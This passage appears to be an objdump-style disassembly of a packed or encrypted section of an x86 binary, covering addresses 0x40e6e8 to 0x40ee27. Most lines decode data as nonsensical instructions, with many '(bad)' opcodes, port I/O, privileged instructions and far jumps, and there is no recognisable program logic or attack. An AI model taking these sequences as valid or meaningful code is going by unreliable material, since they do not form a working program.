  40e6e8:	add    esi,DWORD PTR [ebp-0x28]
  40e6eb:	lods   eax,DWORD PTR ds:[esi]
  40e6ec:	loope  0x40e72c
  40e6ee:	push   edx
  40e6ef:	push   ecx
  40e6f0:	jp     0x40e75d
  40e6f2:	inc    eax
  40e6f3:	pop    ebx
  40e6f4:	in     eax,dx
  40e6f5:	jge    0x40e760
  40e6f7:	ds xchg edi,eax
  40e6f9:	repz jbe 0x40e737
  40e6fc:	rol    DWORD PTR ds:0x104a6171,1
  40e702:	bound  edi,QWORD PTR [edx-0x4924abc4]
  40e708:	mov    al,0xb4
  40e70a:	call   FWORD PTR [ebp-0x71]
  40e70d:	in     al,0xfa
  40e70f:	outs   dx,DWORD PTR ds:[esi]
  40e710:	mov    bl,0x9e
  40e712:	vpsubq xmm6,xmm0,XMMWORD PTR [ecx+0x64e06d04]
  40e71a:	fstp   TBYTE PTR [eax-0x13d26e0a]
  40e720:	outs   dx,BYTE PTR ds:[esi]
  40e721:	or     ecx,DWORD PTR [ebx]
  40e723:	ins    DWORD PTR es:[edi],dx
  40e724:	pop    ss
  40e725:	ret    0xab31
  40e728:	call   0x9850db8
  40e72d:	mov    dh,0x50
  40e72f:	fcmovnbe st,st(6)
  40e731:	retf   
  40e732:	xor    eax,0x9df5415c
  40e737:	and    bl,ch
  40e739:	mov    dh,0xad
  40e73b:	test   DWORD PTR [ebp-0x652ce49c],eax
  40e741:	push   edx
  40e742:	test   DWORD PTR [ebp+0x7f],edi
  40e745:	ins    BYTE PTR es:[edi],dx
  40e746:	or     eax,0x9942a580
  40e74b:	sbb    ecx,eax
  40e74d:	xchg   ebp,eax
  40e74e:	ins    DWORD PTR es:[edi],dx
  40e74f:	ins    BYTE PTR es:[edi],dx
  40e750:	sub    eax,0x1ed0f6c
  40e755:	pop    ebx
  40e756:	push   0x31
  40e758:	in     eax,dx
  40e759:	lods   al,BYTE PTR ds:[esi]
  40e75a:	outs   dx,BYTE PTR ds:[esi]
  40e75b:	in     eax,dx
  40e75c:	mov    dh,0xb5
  40e75e:	cmc    
  40e75f:	xlat   BYTE PTR ds:[ebx]
  40e760:	and    BYTE PTR [edx-0x495d3f5],0x20
  40e767:	mov    ebp,DWORD PTR [eax+0x21add28]
  40e76d:	in     al,0xaf
  40e76f:	(bad)  
  40e770:	jecxz  0x40e7b3
  40e772:	fwait
  40e773:	xor    edx,eax
  40e775:	push   ebp
  40e776:	pop    esp
  40e777:	in     eax,0xa3
  40e779:	mov    edx,0x29308a93
  40e77e:	push   es
  40e77f:	bound  eax,QWORD PTR [ecx]
  40e781:	push   0xbba3fe17
  40e786:	pop    edx
  40e787:	imul   esp,DWORD PTR [esi+0x991abad],0xffffffbf
  40e78e:	mov    bh,BYTE PTR es:[esi]
  40e791:	test   DWORD PTR ds:0x3086d816,eax
  40e797:	mov    ebp,0x7c828d23
  40e79c:	fcomp  DWORD PTR [edx+0x68]
  40e79f:	fld    TBYTE PTR [eax+0x5ceb1444]
  40e7a5:	or     bl,dh
  40e7a7:	and    ah,BYTE PTR [ecx]
  40e7a9:	fld    TBYTE PTR [ebp-0x883a5a3]
  40e7af:	add    dh,BYTE PTR [edx+ebx*4]
  40e7b2:	pop    ecx
  40e7b3:	or     esi,DWORD PTR es:[esi-0x44b9fed1]
  40e7ba:	aam    0x50
  40e7bc:	call   0xaef8:0x970fa108
  40e7c3:	(bad)  
  40e7c5:	int    0xc0
  40e7c7:	push   ss
  40e7c8:	jne    0x40e74d
  40e7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7cb:	mov    cl,BYTE PTR [edi+0x5f67ee14]
  40e7d1:	mov    eax,0x9cb15075
  40e7d6:	adc    DWORD PTR [esi-0x1f],esp
  40e7d9:	out    dx,al
  40e7da:	enter  0xfb00,0x95
  40e7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7df:	lods   eax,DWORD PTR ds:[esi]
  40e7e0:	pop    ebp
  40e7e1:	sub    bl,BYTE PTR [eax+0x2cdaeeea]
  40e7e7:	mov    ah,0x29
  40e7e9:	dec    ebx
  40e7ea:	pop    ebx
  40e7eb:	push   ebx
  40e7ec:	shl    BYTE PTR [ebp+edi*8-0x6],0x6
  40e7f1:	sahf   
  40e7f2:	retf   
  40e7f3:	or     BYTE PTR [ebx],dh
  40e7f5:	push   ss
  40e7f6:	call   0xe3fd:0xd5885ba2
  40e7fd:	cli    
  40e7fe:	mov    BYTE PTR [ebx+0x362ab6db],dl
  40e804:	ret    
  40e805:	out    0xc9,eax
  40e807:	clc    
  40e808:	mov    WORD PTR [edx],ss
  40e80a:	loopne 0x40e7ef
  40e80c:	mov    dh,0x42
  40e80f:	mov    esi,0x3f8cba8e
  40e814:	mov    al,0x7
  40e816:	jne    0x40e82d
  40e818:	outs   dx,BYTE PTR ds:[esi]
  40e819:	in     eax,dx
  40e81a:	inc    edx
  40e81b:	mov    al,ds:0xad2c7028
  40e820:	aas    
  40e821:	or     ch,ah
  40e823:	mov    edx,0xb0b12ed0
  40e828:	sbb    al,0x85
  40e82a:	sbb    ah,bl
  40e82c:	xor    al,BYTE PTR [edi]
  40e82e:	out    dx,eax
  40e82f:	xchg   DWORD PTR [eax+0x7],edx
  40e832:	in     al,dx
  40e833:	and    dh,BYTE PTR [edi-0x1f00af5d]
  40e839:	xchg   esi,eax
  40e83a:	xchg   esi,eax
  40e83b:	fmul   DWORD PTR [edx]
  40e83d:	(bad)  
  40e83e:	ds ret 0xc6b8
  40e842:	xor    eax,0xda2d6eca
  40e847:	xor    BYTE PTR ss:[edi-0x3a49f5aa],bh
  40e84e:	mov    ch,0xf0
  40e850:	ins    DWORD PTR es:[edi],dx
  40e851:	or     al,bl
  40e853:	push   ss
  40e854:	add    al,0xa6
  40e856:	adc    al,0xd
  40e858:	pusha  
  40e859:	shl    dh,1
  40e85b:	pop    ebx
  40e85c:	push   edi
  40e85d:	mov    ah,0xb1
  40e85f:	adc    al,0x9f
  40e861:	in     eax,dx
  40e862:	test   eax,0x82954abe
  40e867:	mov    ch,0xb5
  40e869:	mov    al,0xb5
  40e86b:	push   esi
  40e86c:	(bad)  
  40e86d:	cmp    DWORD PTR ds:[edx],0xaa22a9cc
  40e874:	sub    eax,0x9b7f5ada
  40e879:	push   ds
  40e87a:	frstor [eax]
  40e87c:	mov    dh,0x8e
  40e87e:	push   ss
  40e87f:	call   0x8c0a:0xcf25f190
  40e886:	and    BYTE PTR [esi-0x7f148f4a],cl
  40e88c:	shl    al,1
  40e88e:	xlat   BYTE PTR ds:[ebx]
  40e88f:	adc    BYTE PTR [edx],bl
  40e891:	push   ss
  40e892:	aam    0x74
  40e894:	dec    ebx
  40e895:	lods   eax,DWORD PTR ds:[esi]
  40e896:	mov    dl,dl
  40e898:	rol    ebp,0x6f
  40e89b:	jno    0x40e82a
  40e89d:	mov    dh,0xed
  40e89f:	inc    edx
  40e8a0:	sub    DWORD PTR [ebp+0x2a],0x50573e07
  40e8a7:	cwde   
  40e8a8:	cwde   
  40e8a9:	ret    0x6858
  40e8ac:	and    dl,bl
  40e8ae:	jge    0x40e8e7
  40e8b0:	sub    eax,0xb6b3675c
  40e8b5:	mov    dh,0xf2
  40e8b7:	fucomip st,st(2)
  40e8b9:	ins    DWORD PTR es:[edi],dx
  40e8ba:	add    BYTE PTR [eax],0xa1
  40e8bd:	repz add dh,bh
  40e8c0:	mov    eax,DWORD PTR [esp+edx*8+0x2b]
  40e8c4:	add    DWORD PTR [ebx],ecx
  40e8c6:	fild   DWORD PTR [edi]
  40e8c8:	pop    ss
  40e8c9:	add    DWORD PTR [edi-0x3a],ebp
  40e8cc:	xlat   BYTE PTR ds:[ebx]
  40e8cd:	test   BYTE PTR [ebx],cl
  40e8cf:	repz push 0x507694e2
  40e8d5:	sbb    eax,0xd9988efc
  40e8da:	lea    eax,[edi-0x3e]
  40e8dd:	push   edx
  40e8de:	mov    ebx,0x9ba60c6d
  40e8e3:	sub    eax,0x8f7d3e67
  40e8e8:	pop    ebx
  40e8e9:	mov    ch,0xb
  40e8eb:	in     eax,dx
  40e8ec:	(bad)  
  40e8ed:	pusha  
  40e8ee:	push   ecx
  40e8ef:	hlt    
  40e8f0:	fild   DWORD PTR [edi+esi*1-0xa]
  40e8f4:	mov    eax,ds:0xbb5b0be0
  40e8f9:	ins    DWORD PTR es:[edi],dx
  40e8fa:	aaa    
  40e8fb:	adc    eax,0x1d0c06f2
  40e900:	mov    al,0xec
  40e902:	jae    0x40e8b1
  40e904:	push   esi
  40e905:	fisubr DWORD PTR [esi]
  40e907:	ins    BYTE PTR es:[edi],dx
  40e908:	push   esi
  40e909:	enter  0x8b4c,0x4d
  40e90d:	push   ebx
  40e90e:	xor    dl,BYTE PTR [edi]
  40e910:	and    eax,edx
  40e912:	test   DWORD PTR [edi-0x1f34d325],esp
  40e918:	jns    0x40e8b5
  40e91a:	(bad)  
  40e91b:	rcl    DWORD PTR [ecx+0x6e],cl
  40e91e:	mov    ds:0xd6ca3616,eax
  40e923:	cmc    
  40e924:	(bad)  
  40e925:	push   0x82b7806
  40e92a:	rol    BYTE PTR [edx-0x2f],1
  40e92d:	call   0xc454:0xf32c4ee0
  40e934:	mov    dh,0x6d
  40e936:	or     eax,0x3859bbef
  40e93b:	outs   dx,BYTE PTR ds:[esi]
  40e93c:	or     DWORD PTR [esi],0x5a1725c
  40e942:	mov    al,0x70
  40e944:	push   edx
  40e945:	shl    BYTE PTR [esi+0x44],1
  40e948:	(bad)  
  40e949:	fdiv   QWORD PTR [esi-0x51ec7a7b]
  40e94f:	jmp    0x40e9b9
  40e951:	rcl    DWORD PTR [edi+0x14],1
  40e954:	xor    ebx,DWORD PTR [edi-0x4c]
  40e957:	shl    DWORD PTR [esi+0x51],1
  40e95a:	int    0xf5
  40e95c:	cmp    al,BYTE PTR [edi-0x4f]
  40e95f:	retf   0x83b6
  40e962:	mov    edx,0xc8254db4
  40e967:	outs   dx,BYTE PTR ds:[esi]
  40e968:	shl    BYTE PTR [edx],cl
  40e96a:	nop
  40e96b:	add    DWORD PTR [edx],0x8ddb0adb
  40e971:	arpl   WORD PTR [edx-0x3e8e1679],ax
  40e977:	dec    edx
  40e978:	aaa    
  40e979:	jecxz  0x40e9e8
  40e97b:	scas   al,BYTE PTR es:[edi]
  40e97c:	ins    DWORD PTR es:[edi],dx
  40e97d:	popa   
  40e97e:	pop    ds
  40e97f:	lods   al,BYTE PTR cs:[esi]
  40e981:	adc    al,0x3
  40e983:	rol    DWORD PTR [edi-0x79],0xb4
  40e987:	inc    eax
  40e988:	ins    BYTE PTR es:[edi],dx
  40e989:	sub    eax,0xbd889d53
  40e98e:	pop    es
  40e98f:	sbb    al,0xa5
  40e991:	test   DWORD PTR [ebp+0x59f83bad],eax
  40e997:	cmp    eax,0xb6bfb2de
  40e99c:	mov    dh,0x85
  40e99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e99f:	lods   eax,DWORD PTR ds:[esi]
  40e9a0:	mov    BYTE PTR [ebx+0x79052072],ah
  40e9a6:	or     eax,0xb2adb02
  40e9ab:	fnsave [esi]
  40e9ad:	pushf  
  40e9ae:	std    
  40e9af:	mov    bl,0xfc
  40e9b1:	jecxz  0x40e9d9
  40e9b3:	fist   DWORD PTR [eax]
  40e9b5:	scas   eax,DWORD PTR es:[edi]
  40e9b6:	pop    ebx
  40e9b7:	xor    DWORD PTR ds:0x9440dccb,0xffffff97
  40e9be:	or     dl,BYTE PTR [ebp-0x48]
  40e9c1:	jne    0x40e9b4
  40e9c3:	xlat   BYTE PTR ds:[ebx]
  40e9c4:	fld    DWORD PTR [edx+0x6de63fc2]
  40e9ca:	xchg   edi,eax
  40e9cb:	or     ch,BYTE PTR [esp+edx*8-0x3d]
  40e9cf:	ins    BYTE PTR es:[edi],dx
  40e9d0:	ja     0x40e9f4
  40e9d2:	or     eax,0x1a36c1cb
  40e9d7:	shl    BYTE PTR [esi-0x558417a],0xb2
  40e9de:	ss scas al,BYTE PTR es:[edi]
  40e9e0:	pop    edi
  40e9e1:	fdivr  DWORD PTR [edx]
  40e9e3:	and    dl,BYTE PTR [edx-0x38]
  40e9e6:	dec    edx
  40e9e7:	lock loop 0x40ea57
  40e9ea:	and    al,BYTE PTR [eax]
  40e9ec:	jns    0x40ea2f
  40e9ee:	mov    bh,0x8d
  40e9f0:	in     eax,0x7f
  40e9f2:	add    BYTE PTR [esi+esi*8+0x27],ch
  40e9f6:	jp     0x40e9f6
  40e9f8:	sub    bh,bl
  40e9fa:	(bad)  
  40e9fb:	cs ins BYTE PTR es:[edi],dx
  40e9fd:	dec    ebp
  40e9fe:	enter  0xf53d,0x94
  40ea02:	and    al,BYTE PTR [edx]
  40ea04:	into   
  40ea05:	adc    DWORD PTR [ebx],ecx
  40ea07:	and    dl,BYTE PTR [esi]
  40ea09:	pop    edx
  40ea0a:	rcl    BYTE PTR [ebx-0x65eef283],1
  40ea10:	or     ch,BYTE PTR [esi]
  40ea12:	xchg   esp,eax
  40ea13:	sar    dl,0xab
  40ea16:	push   ds
  40ea17:	(bad)  
  40ea19:	mov    ds:0xb78968a9,eax
  40ea1e:	pop    ds
  40ea1f:	push   edi
  40ea20:	add    eax,0xd85a58ff
  40ea25:	bound  eax,QWORD PTR [esi+0x3ed6651b]
  40ea2b:	dec    ebp
  40ea2c:	iret   
  40ea2d:	lods   eax,DWORD PTR ds:[esi]
  40ea2e:	jne    0x40ea99
  40ea30:	pop    ebx
  40ea31:	jae    0x40ea6e
  40ea33:	sbb    DWORD PTR [eax-0x359b5762],0xffffff86
  40ea3a:	pop    ss
  40ea3b:	fisub  DWORD PTR [ebp+0x186ef8a5]
  40ea41:	fwait
  40ea42:	jle    0x40e9f5
  40ea44:	sub    al,0x97
  40ea46:	push   edi
  40ea47:	sbb    DWORD PTR [eax+0x60],ebx
  40ea4a:	mov    eax,ds:0x8999f56d
  40ea4f:	sub    edx,DWORD PTR [ecx+0x76b64fe4]
  40ea55:	imul   ebx,ebp,0x72
  40ea58:	fcmovu st,st(6)
  40ea5a:	pop    eax
  40ea5b:	aam    0xef
  40ea5d:	mov    esp,0xc2f01ab9
  40ea62:	mov    dh,0x50
  40ea64:	add    ah,BYTE PTR [esi-0x1a9dcff0]
  40ea6a:	sbb    al,0x6b
  40ea6c:	fild   DWORD PTR [esi-0x17]
  40ea6f:	sbb    eax,0x44f6ad28
  40ea74:	mov    dh,0x2f
  40ea76:	jp     0x40ea5f
  40ea78:	fimul  DWORD PTR [ebp-0x5df2bd73]
  40ea7e:	je     0x40ea2b
  40ea80:	xor    ecx,DWORD PTR [ebx-0x2a4f3cfe]
  40ea86:	mov    ds:0x8eeb7f2a,al
  40ea8b:	out    0x42,eax
  40ea8d:	sti    
  40ea8e:	shl    DWORD PTR [esi-0x32],1
  40ea91:	inc    ebx
  40ea92:	outs   dx,BYTE PTR ds:[esi]
  40ea93:	jne    0x40ea83
  40ea95:	in     al,0x71
  40ea97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea98:	push   0xffffff85
  40ea9a:	bound  ebp,QWORD PTR [ecx+0x6aa6fc]
  40eaa0:	jae    0x40ea32
  40eaa2:	adc    al,0x6b
  40eaa4:	dec    ebx
  40eaa5:	mov    ah,0xb5
  40eaa7:	or     ecx,DWORD PTR [ebx-0x32]
  40eaaa:	aaa    
  40eaab:	sub    BYTE PTR [esi-0x5],dl
  40eaae:	pop    edi
  40eaaf:	inc    esp
  40eab0:	fnstenv [esi-0xd490350]
  40eab6:	sbb    al,0x8f
  40eab8:	xchg   esp,eax
  40eab9:	dec    edx
  40eaba:	add    BYTE PTR [eax],bh
  40eabc:	sbb    eax,0xd7a34696
  40eac1:	fld    QWORD PTR [edx+0x510ec41c]
  40eac7:	sub    DWORD PTR [ecx-0x6],eax
  40eaca:	push   0xaaad8ddb
  40eacf:	retf   
  40ead0:	cmp    eax,0xfb37ca1b
  40ead5:	push   ecx
  40ead6:	lds    esp,FWORD PTR [ebx+0x5b]
  40ead9:	pusha  
  40eada:	(bad)  [eax-0x19]
  40eadd:	sahf   
  40eade:	jg     0x40eb55
  40eae0:	daa    
  40eae1:	(bad)  
  40eae2:	cwde   
  40eae3:	or     al,0x1b
  40eae5:	adc    al,0xaa
  40eae7:	ins    DWORD PTR es:[edi],dx
  40eae8:	xlat   BYTE PTR ds:[ebx]
  40eae9:	or     ebx,ecx
  40eaeb:	cmp    BYTE PTR [esi+0x6e0aec26],al
  40eaf1:	sub    al,0xa0
  40eaf3:	outs   dx,DWORD PTR ds:[esi]
  40eaf4:	rep outs dx,BYTE PTR ds:[esi]
  40eaf6:	es xchg esp,eax
  40eaf8:	in     al,0x62
  40eafa:	imul   esp,DWORD PTR [ecx-0x6ddfc693],0x52
  40eb01:	cmp    edi,esi
  40eb03:	mov    al,0x5
  40eb05:	pop    ebx
  40eb06:	arpl   WORD PTR [ecx],ax
  40eb08:	and    DWORD PTR [edi+0x50f7aa39],ebp
  40eb0e:	mov    ds:0x477d6b68,eax
  40eb13:	rol    esp,cl
  40eb15:	(bad)  [esi-0x541fe973]
  40eb1b:	pop    edx
  40eb1c:	sbb    eax,0xf56b9ec0
  40eb21:	sbb    ebp,DWORD PTR [ebp-0x516f897d]
  40eb27:	in     al,dx
  40eb28:	and    ebp,DWORD PTR ds:0x5631664d
  40eb2e:	dec    BYTE PTR [ebx+0x6c]
  40eb31:	out    dx,eax
  40eb32:	in     eax,0x76
  40eb34:	and    eax,0x31a90080
  40eb39:	add    BYTE PTR [edi+0xbb608f1],dl
  40eb3f:	sbb    ebp,ebp
  40eb41:	stc    
  40eb42:	repnz pop edi
  40eb44:	aas    
  40eb45:	stos   DWORD PTR es:[edi],eax
  40eb46:	addr16 xor eax,0xbb3e5cb5
  40eb4c:	sub    eax,0xc739342c
  40eb51:	pop    ebx
  40eb52:	or     eax,0x58755c0d
  40eb57:	dec    ebp
  40eb58:	mov    al,0x6d
  40eb5a:	ins    DWORD PTR es:[edi],dx
  40eb5b:	pop    ebx
  40eb5c:	or     BYTE PTR [edx-0x71],dl
  40eb5f:	jae    0x40eb80
  40eb61:	xor    al,0x2
  40eb63:	pop    es
  40eb64:	fisubr DWORD PTR [eax-0x4c]
  40eb67:	mov    dh,0xdc
  40eb69:	push   ebp
  40eb6a:	imul   edi,edi,0x51
  40eb6d:	rcl    BYTE PTR [eax+0x0],0xb6
  40eb71:	jbe    0x40eb4e
  40eb73:	and    ah,BYTE PTR [eax]
  40eb75:	sbb    bh,BYTE PTR [ecx]
  40eb77:	(bad)  
  40eb78:	fst    QWORD PTR [ebx+0x67]
  40eb7b:	sbb    BYTE PTR [ebx-0x45],0x50
  40eb7f:	loope  0x40eb88
  40eb81:	(bad)  [ebx]
  40eb83:	sahf   
  40eb84:	push   eax
  40eb85:	pop    es
  40eb86:	cmp    bl,bl
  40eb88:	xchg   esi,eax
  40eb89:	or     ch,BYTE PTR [esi+0x61f221d6]
  40eb8f:	fnsave [edi-0x80]
  40eb92:	les    ebp,FWORD PTR [ebp+0x4fbb62a9]
  40eb98:	shl    dh,1
  40eb9a:	cmc    
  40eb9b:	sbb    dl,dl
  40eb9d:	lea    ebp,[ebp-0x5f]
  40eba0:	pop    es
  40eba1:	push   ebp
  40eba2:	jnp    0x40eb30
  40eba4:	ret    
  40eba5:	loope  0x40eb59
  40eba7:	xchg   ebx,eax
  40eba8:	mov    WORD PTR [edx],ds
  40ebaa:	or     edx,DWORD PTR [edi+0x68389eb6]
  40ebb0:	pushf  
  40ebb1:	les    ecx,FWORD PTR [edi-0x41]
  40ebb4:	fistp  DWORD PTR [ebx+0xd]
  40ebb7:	test   al,0xdd
  40ebb9:	xor    eax,0xf7b030fc
  40ebbe:	mov    ch,0x13
  40ebc0:	scas   al,BYTE PTR es:[edi]
  40ebc1:	or     BYTE PTR [ebx+0x1b],0x6f
  40ebc5:	xchg   edx,eax
  40ebc6:	dec    edx
  40ebc7:	mov    ?,WORD PTR [esi+0x3615bac0]
  40ebcd:	mov    ds:0x7ff9b790,al
  40ebd2:	sbb    ch,BYTE PTR [ebx-0x49f6a420]
  40ebd8:	xchg   BYTE PTR [ecx+0x6],ah
  40ebdb:	lds    ebx,FWORD PTR [eax+esi*4]
  40ebde:	push   0xb1b0b01c
  40ebe3:	ins    DWORD PTR es:[edi],dx
  40ebe4:	clc    
  40ebe5:	add    al,0xb
  40ebe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe8:	cmp    DWORD PTR [ecx-0x72],eax
  40ebeb:	rol    dl,cl
  40ebed:	(bad)  
  40ebee:	(bad)  
  40ebef:	mov    eax,0x66b40973
  40ebf4:	cmp    ecx,DWORD PTR [edi+0x45cd712d]
  40ebfa:	mov    ebx,0x585ec2c0
  40ebff:	in     al,0x7e
  40ec01:	fbld   TBYTE PTR [esi-0x2f]
  40ec04:	outs   dx,DWORD PTR ds:[esi]
  40ec05:	dec    ebx
  40ec06:	fild   DWORD PTR [esi]
  40ec08:	lock out dx,al
  40ec0a:	xchg   edx,eax
  40ec0b:	leave  
  40ec0c:	fwait
  40ec0d:	pmaddwd mm2,QWORD PTR [eax-0x4f4a0900]
  40ec14:	mov    ch,0x2d
  40ec16:	jp     0x40ec1d
  40ec18:	sbb    al,dl
  40ec1a:	cmp    al,0xa0
  40ec1c:	jmp    0x5b3:0x4adb6dda
  40ec23:	jp     0x40ec84
  40ec25:	inc    esp
  40ec26:	ret    0x6dd8
  40ec29:	inc    ecx
  40ec2a:	mov    bh,0x6d
  40ec2c:	pop    ebx
  40ec2d:	fimul  DWORD PTR [ebp-0x4f]
  40ec30:	jecxz  0x40ebfc
  40ec32:	sti    
  40ec33:	mov    ah,0x2c
  40ec35:	(bad)  
  40ec36:	jp     0x40ebce
  40ec38:	add    eax,0x1135baa6
  40ec3d:	outs   dx,BYTE PTR ds:[esi]
  40ec3e:	pusha  
  40ec3f:	inc    edi
  40ec40:	pop    ds
  40ec41:	push   ecx
  40ec42:	(bad)  
  40ec43:	xchg   esi,eax
  40ec44:	and    dh,BYTE PTR ss:[esi-0xb789128]
  40ec4b:	adc    ah,dl
  40ec4d:	(bad)  
  40ec4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec4f:	push   edx
  40ec50:	mov    al,0x35
  40ec52:	cdq    
  40ec53:	push   ebx
  40ec54:	les    edx,FWORD PTR [esp+esi*2+0x2b]
  40ec58:	fmul   st(2),st
  40ec5a:	ror    ah,cl
  40ec5c:	out    dx,eax
  40ec5d:	out    dx,eax
  40ec5e:	fld    TBYTE PTR [edx+0x52b83b7]
  40ec64:	fiadd  DWORD PTR [esi-0x20]
  40ec67:	push   0x40
  40ec69:	je     0x40ec8d
  40ec6b:	inc    esi
  40ec6c:	add    eax,0x36d6dba
  40ec71:	adc    cl,al
  40ec73:	lods   eax,DWORD PTR ds:[esi]
  40ec74:	(bad)  
  40ec75:	stc    
  40ec76:	sti    
  40ec77:	sub    al,0xb0
  40ec79:	je     0x40ecdc
  40ec7b:	jae    0x40eccd
  40ec7d:	ret    0xf5dd
  40ec80:	popf   
  40ec81:	and    ch,BYTE PTR [eax+0x6db5b0b2]
  40ec87:	push   edi
  40ec88:	inc    esi
  40ec89:	(bad)  
  40ec8b:	adc    edi,edi
  40ec8d:	ja     0x40ecc1
  40ec8f:	jns    0x40ecc7
  40ec91:	fisubr DWORD PTR [ebp+0x5fd0c146]
  40ec97:	mov    ds:0x2d4aa5f8,al
  40ec9c:	xor    eax,0x94521620
  40eca1:	pop    ss
  40eca2:	fwait
  40eca3:	xor    al,0x2
  40eca5:	gs jecxz 0x40ec5e
  40eca8:	and    esi,DWORD PTR [esi]
  40ecaa:	jge    0x40ecd0
  40ecac:	jg     0x40ec89
  40ecae:	in     eax,dx
  40ecaf:	dec    ebx
  40ecb0:	(bad)  
  40ecb1:	mov    gs,edx
  40ecb3:	ret    0x8e7d
  40ecb6:	aad    0x5f
  40ecb8:	fs pop eax
  40ecba:	int3   
  40ecbb:	inc    ebp
  40ecbc:	and    bl,BYTE PTR [eax+0x2a]
  40ecbf:	call   DWORD PTR ds:0x1f2b00
  40ecc5:	pop    ds
  40ecc6:	repnz mov eax,ds:0xd15a17f8
  40eccc:	push   esi
  40eccd:	repz push esi
  40eccf:	out    dx,al
  40ecd0:	popa   
  40ecd1:	icebp  
  40ecd2:	adc    ch,al
  40ecd4:	sub    BYTE PTR ds:0x8ea1110d,al
  40ecda:	cmp    DWORD PTR [eax+0x12dda97c],esi
  40ece0:	dec    DWORD PTR [ebp-0x44]
  40ece3:	adc    al,0xf2
  40ece5:	push   esi
  40ece6:	add    bh,dl
  40ece8:	push   ebp
  40ece9:	ins    DWORD PTR es:[edi],dx
  40ecea:	adc    eax,0x7f67b6db
  40ecef:	imul   ecx,DWORD PTR [esp+ebp*1+0x36fc9a8],0xffffffd0
  40ecf7:	ins    DWORD PTR es:[edi],dx
  40ecf8:	mov    ds:0x11fe0605,eax
  40ecfd:	fadd   st(4),st
  40ecff:	cmp    BYTE PTR [ebx],bl
  40ed01:	or     ecx,DWORD PTR [ebx]
  40ed03:	ins    DWORD PTR es:[edi],dx
  40ed04:	loope  0x40ed22
  40ed06:	sahf   
  40ed07:	scas   eax,DWORD PTR es:[edi]
  40ed08:	xchg   ebp,eax
  40ed09:	pop    esi
  40ed0a:	fiadd  DWORD PTR [edx+0x5a]
  40ed0d:	mov    dh,0x6d
  40ed0f:	mov    ebx,0x3b89626d
  40ed14:	mov    ah,0x86
  40ed16:	sbb    ah,BYTE PTR [ebx-0x68]
  40ed19:	scas   al,BYTE PTR es:[edi]
  40ed1a:	sub    DWORD PTR [edx-0x2b4787ea],edx
  40ed20:	dec    ebp
  40ed21:	rcl    BYTE PTR es:[edx+0x7c75c0e8],1
  40ed28:	mov    dh,0x8d
  40ed2a:	jbe    0x40ed07
  40ed2c:	pop    esp
  40ed2d:	xor    ecx,DWORD PTR [edi+0x724afaca]
  40ed33:	hlt    
  40ed34:	jge    0x40ecf6
  40ed36:	jne    0x40eda3
  40ed38:	(bad)  [esi]
  40ed3a:	or     al,0x3a
  40ed3c:	sub    al,0x4c
  40ed3e:	mov    esp,0xc239cd0f
  40ed43:	mov    ds:0x5200d405,eax
  40ed48:	repnz dec edx
  40ed4a:	dec    eax
  40ed4b:	(bad)  
  40ed4d:	mov    dh,0x6d
  40ed4f:	mov    esi,DWORD PTR [esi+0x7dc1b3d0]
  40ed55:	aas    
  40ed56:	cs or  bh,cl
  40ed59:	test   eax,0xe901d6e0
  40ed5e:	adc    BYTE PTR [edx],bl
  40ed60:	sub    DWORD PTR [edi+edi*4-0x5225224c],edi
  40ed67:	jae    0x40ed04
  40ed69:	in     al,dx
  40ed6a:	out    dx,al
  40ed6b:	aam    0x89
  40ed6d:	ins    BYTE PTR es:[edi],dx
  40ed6e:	sbb    ebp,DWORD PTR [edi]
  40ed70:	popf   
  40ed71:	rol    DWORD PTR [ecx-0x7d],0xa0
  40ed75:	sub    DWORD PTR [ecx-0x7a49feb9],ebp
  40ed7b:	test   DWORD PTR [ebp+0x5b],ebp
  40ed7e:	aam    0x11
  40ed80:	and    dh,al
  40ed82:	shr    DWORD PTR [ebx+eax*4-0x49f22568],0x16
  40ed8a:	icebp  
  40ed8b:	test   DWORD PTR [ecx-0x2b755eb7],edx
  40ed91:	aam    0x30
  40ed93:	pop    ebp
  40ed94:	push   0x3bc32997
  40ed99:	xchg   ebp,eax
  40ed9a:	rcl    bl,1
  40ed9c:	pusha  
  40ed9d:	(bad)  [bp-0x2f4c]
  40eda2:	jnp    0x40ee17
  40eda4:	adc    edi,0xd138ef5d
  40edaa:	xchg   DWORD PTR ds:0x174ba5b4,ebp
  40edb0:	sar    DWORD PTR ds:0x42008f8,1
  40edb6:	lahf   
  40edb7:	shl    BYTE PTR [ebp+0x14b112a5],1
  40edbd:	arpl   WORD PTR [ebx-0x4f4efb3a],bx
  40edc3:	shl    DWORD PTR [esi],1
  40edc5:	ds ja  0x40edc1
  40edc8:	ret    0xf1c0
  40edcb:	xor    al,0x40
  40edcd:	or     ebp,ebp
  40edcf:	mov    dh,0xb4
  40edd1:	push   ecx
  40edd2:	ins    DWORD PTR es:[edi],dx
  40edd3:	push   ebx
  40edd4:	mov    ebp,0x23a390f2
  40edd9:	mov    ch,0xa6
  40eddb:	mov    dh,0xdd
  40eddd:	push   0x38628082
  40ede2:	outs   dx,DWORD PTR ds:[esi]
  40ede3:	pop    esi
  40ede4:	ret    
  40ede5:	cmc    
  40ede6:	(bad)  
  40ede7:	mov    bl,0x5b
  40ede9:	jmp    0x3bea541
  40edee:	jg     0x40ee3e
  40edf0:	jg     0x40ee25
  40edf2:	gs adc al,0x1c
  40edf5:	pop    ebx
  40edf6:	mov    ecx,0x67e20b6d
  40edfb:	or     BYTE PTR [ebx],dh
  40edfd:	aam    0xd0
  40edff:	loope  0x40ee2a
  40ee01:	imul   ecx,DWORD PTR [edx],0x2f6db6d1
  40ee07:	arpl   WORD PTR [ebx],sp
  40ee09:	fwait
  40ee0a:	dec    edx
  40ee0b:	pusha  
  40ee0c:	or     al,BYTE PTR [eax]
  40ee0e:	fsubr  DWORD PTR cs:[eax]
  40ee11:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ee13:	sub    edx,eax
  40ee15:	outs   dx,BYTE PTR ds:[esi]
  40ee16:	pop    ebx
  40ee17:	or     esi,DWORD PTR [ebp-0x5e2afb63]
  40ee1d:	je     0x40edbd
  40ee1f:	inc    esp
  40ee20:	mov    al,0xb5
  40ee22:	push   eax
  40ee23:	arpl   WORD PTR cs:[esi-0x6f],si
  40ee27:	and    eax,0x943a042c
